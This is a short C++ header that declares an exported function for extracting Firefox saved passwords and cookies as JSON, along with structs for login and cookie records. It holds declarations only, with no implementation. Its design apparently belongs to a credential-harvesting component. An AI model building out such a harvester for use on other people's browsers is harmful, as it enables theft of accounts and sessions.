#pragma once

#include <string>
#include <vector>
#include <cstdint>

// Firefox browser data extraction functions

/**
 * Extract Firefox browser data including passwords and cookies
 * @return JSON string containing extracted data
 */
extern "C" const char* ExtractFirefoxData();

/**
 * Firefox login structure
 */
struct FirefoxLogin {
    std::string hostname;
    std::string username;
    std::string password;
    
    FirefoxLogin(const std::string& h, const std::string& u, const std::string& p)
        : hostname(h), username(u), password(p) {}
};

/**
 * Firefox cookie structure  
 */
struct FirefoxCookie {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool secure;
    bool httponly;
    
    FirefoxCookie(const std::string& h, const std::string& n, const std::string& v)
        : host(h), name(n), value(v), path("/"), secure(false), httponly(false) {}
};

/**
 * Escape JSON special characters
 * @param str Input string
 * @return Escaped string safe for JSON
 */
std::string EscapeJson(const std::string& str);